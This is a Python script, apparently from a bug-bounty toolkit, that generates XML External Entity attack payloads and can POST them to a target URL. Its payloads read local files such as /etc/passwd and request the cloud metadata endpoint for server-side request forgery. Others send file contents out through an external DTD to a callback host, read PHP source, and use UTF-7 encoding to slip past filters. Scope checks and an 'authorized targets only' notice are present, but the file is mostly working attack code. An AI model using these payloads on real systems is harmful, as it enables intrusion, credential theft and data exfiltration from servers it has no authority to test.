#!/usr/bin/env python3
"""XXE payload builder + optional bounded sender.

Builds XML External Entity payloads for the shapes that still pay:

  * classic file read
  * SSRF via external entity
  * OOB exfil via an external DTD (blind XXE)
  * XInclude (when DOCTYPE is blocked)
  * SVG-wrapped XXE (image/SVG upload / render)
  * UTF-7 encoded variant (UTF-8 pattern-filter bypass)
  * PHP filter wrapper (base64 source read)

By default this is an offline generator. ``--send`` performs one POST with the
payload using ``tools.safe_http.safe_urlopen`` (SSRF guard + optional scope
guard) and prints only status/length unless ``--show-response`` is set.

Authorized targets only. Use a callback domain you control; do not exfiltrate
real data beyond the minimum proof.

Usage:
  tools/xxe_probe.py --kind file --path /etc/passwd
  tools/xxe_probe.py --kind oob --callback https://YOUR.oast.fun --out xxe.txt
  tools/xxe_probe.py --kind svg --path /etc/passwd --json
  tools/xxe_probe.py --kind file --path /etc/passwd \
      --send https://target.com/api/import --in-scope target.com
"""
from __future__ import annotations

import argparse
import json
import sys
import urllib.error
import urllib.request
from dataclasses import dataclass, asdict
from pathlib import Path

_REPO = __import__("os").path.dirname(__import__("os").path.dirname(__import__("os").path.abspath(__file__)))
if _REPO not in sys.path:
    sys.path.insert(0, _REPO)
from tools.safe_http import safe_urlopen  # noqa: E402

USER_AGENT = "agentic-bug-hunter/xxe_probe"


@dataclass
class XxePayload:
    kind: str
    xml: str
    dtd: str
    notes: str
    requires: str


def _file_entity(path: str) -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{path}">]>\n'
        "<foo>&xxe;</foo>\n"
    )


def _ssrf_entity(url: str) -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{url}">]>\n'
        "<foo>&xxe;</foo>\n"
    )


def _oob(callback: str, path: str) -> tuple[str, str]:
    dtd_url = callback.rstrip("/") + "/oob.dtd"
    xml = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{dtd_url}"> %xxe;]>\n'
        "<foo>ping</foo>\n"
    )
    dtd = (
        f'<!ENTITY % file SYSTEM "file://{path}">\n'
        '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '
        f"'http://{callback.split('://', 1)[-1].split('/')[0]}/?d=%file;'>\">\n"
        "%eval; %exfil;\n"
    )
    return xml, dtd


def _xinclude(path: str) -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude">\n'
        f'  <xi:include href="file://{path}" parse="text"/>\n'
        "</foo>\n"
    )


def _svg(path: str) -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file://{path}">]>\n'
        '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n'
        "  <text x=\"10\" y=\"20\">&xxe;</text>\n"
        "</svg>\n"
    )


def _php_filter() -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"php://filter/convert.base64-encode/resource=index.php">]>\n'
        "<foo>&xxe;</foo>\n"
    )


def build_payload(kind: str, path: str = "/etc/passwd", url: str = "",
                  callback: str = "") -> XxePayload:
    kind = (kind or "").lower()
    if kind == "file":
        return XxePayload("file", _file_entity(path), "",
                          "Classic file read; output appears in the parsed document.",
                          "Parser resolves external general entities and the response reflects the entity value.")
    if kind == "ssrf":
        return XxePayload("ssrf", _ssrf_entity(url or "http://169.254.169.254/latest/meta-data/"), "",
                          "SSRF via external entity; blind unless the response reflects the fetch.",
                          "Parser resolves external entities and has network reachability.")
    if kind == "oob":
        if not callback:
            raise ValueError("--callback is required for the oob kind")
        xml, dtd = _oob(callback, path)
        return XxePayload("oob", xml, dtd,
                          "Blind XXE: host oob.dtd at <callback>/oob.dtd and watch DNS/HTTP. "
                          "The DTD exfiltrates the file via a parameter entity.",
                          "Outbound DNS/HTTP from the target; parameter entities enabled.")
    if kind == "xinclude":
        return XxePayload("xinclude", _xinclude(path), "",
                          "XInclude path when DOCTYPE is stripped but the parser supports XInclude.",
                          "Parser has XInclude enabled; input is embedded in a larger XML document.")
    if kind == "svg":
        return XxePayload("svg", _svg(path), "",
                          "SVG upload/render path; useful when images are parsed as XML.",
                          "SVG is parsed server-side with external entity resolution.")
    if kind == "php-filter":
        return XxePayload("php-filter", _php_filter(), "",
                          "PHP source read as base64; decode the entity value in the response.",
                          "PHP libxml with external entities; a readable PHP file exists.")
    if kind == "utf7":
        xml = _file_entity(path).replace(
            '<?xml version="1.0" encoding="UTF-8"?>',
            '<?xml version="1.0" encoding="UTF-7"?>',
        ).encode("utf-7").decode("ascii")
        return XxePayload("utf7", xml, "",
                          "UTF-7 encoded payload for filters that match UTF-8 entity patterns only.",
                          "Parser honors the UTF-7 XML declaration and resolves external entities.")
    raise ValueError(f"unknown kind: {kind}")


def _load_scope(patterns: list[str]):
    if not patterns:
        return None
    from tools.scope_checker import ScopeChecker
    return ScopeChecker(patterns)


def send_payload(
    target: str,
    payload: str,
    timeout: float = 10.0,
    scope_patterns: list[str] | None = None,
    headers: dict[str, str] | None = None,
    show_response: bool = False,
) -> dict:
    """Send one payload. Returns status/length/preview (never writes it)."""
    checker = _load_scope(scope_patterns or [])
    if checker is not None and not checker.is_in_scope(target):
        return {"status": 0, "error": "out of scope", "preview": ""}
    hdrs = {"User-Agent": USER_AGENT, "Content-Type": "application/xml", "X-Bug-Bounty": "agentic-bug-hunter"}
    hdrs.update(headers or {})
    req = urllib.request.Request(target, data=payload.encode("utf-8"), headers=hdrs, method="POST")
    try:
        resp = safe_urlopen(req, timeout=timeout, max_redirects=1, scope_checker=checker)
    except (urllib.error.URLError, urllib.error.HTTPError, ValueError, OSError) as exc:
        return {"status": 0, "error": str(exc)[:200], "preview": ""}
    status = getattr(resp, "status", 0) or getattr(resp, "code", 0) or 0
    try:
        raw = resp.read(4096) or b""
    finally:
        try:
            resp.close()
        except Exception:
            pass
    text = raw.decode("utf-8", errors="ignore")
    return {
        "status": status,
        "length": len(raw),
        "preview": text[:500] if show_response else "",
    }


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="XXE payload builder + bounded sender.")
    ap.add_argument("--kind", default="file",
                    choices=["file", "ssrf", "oob", "xinclude", "svg", "php-filter", "utf7"])
    ap.add_argument("--path", default="/etc/passwd", help="File path for file/oob/xinclude/svg")
    ap.add_argument("--url", default="", help="Internal URL for the ssrf kind")
    ap.add_argument("--callback", default="", help="OOB callback base, e.g. https://abc.oast.fun")
    ap.add_argument("--out", help="Write payload XML (and oob.dtd for oob) to this path")
    ap.add_argument("--json", action="store_true", help="Machine-readable output")
    ap.add_argument("--send", help="POST the payload to this URL")
    ap.add_argument("--in-scope", action="append", default=[], help="Allowed domain pattern for --send")
    ap.add_argument("--header", action="append", default=[], help="Extra header key=value (repeatable)")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--show-response", action="store_true",
                    help="Include a 500-char response preview (may contain sensitive data)")
    args = ap.parse_args(argv)

    try:
        payload = build_payload(args.kind, args.path, args.url, args.callback)
    except ValueError as exc:
        ap.error(str(exc))

    headers: dict[str, str] = {}
    for h in args.header:
        if "=" not in h:
            ap.error(f"header must be key=value: {h!r}")
        k, v = h.split("=", 1)
        headers[k.strip()] = v.strip()

    if args.out:
        out = Path(args.out)
        out.write_text(payload.xml, encoding="utf-8")
        if payload.dtd:
            out.with_name("oob.dtd").write_text(payload.dtd, encoding="utf-8")
        print(f"Wrote payload to {out}" + (" (+ oob.dtd)" if payload.dtd else ""))

    if args.json:
        print(json.dumps(asdict(payload), indent=2))
    else:
        print(f"# kind: {payload.kind}")
        print(f"# {payload.notes}")
        print(f"# Requires: {payload.requires}")
        print("\n--- payload.xml ---")
        print(payload.xml)
        if payload.dtd:
            print("--- oob.dtd (host at <callback>/oob.dtd) ---")
            print(payload.dtd)

    if args.send:
        result = send_payload(args.send, payload.xml, timeout=args.timeout,
                              scope_patterns=args.in_scope, headers=headers,
                              show_response=args.show_response)
        print("\n--- send result ---")
        print(json.dumps(result, indent=2))
        if result.get("error"):
            return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())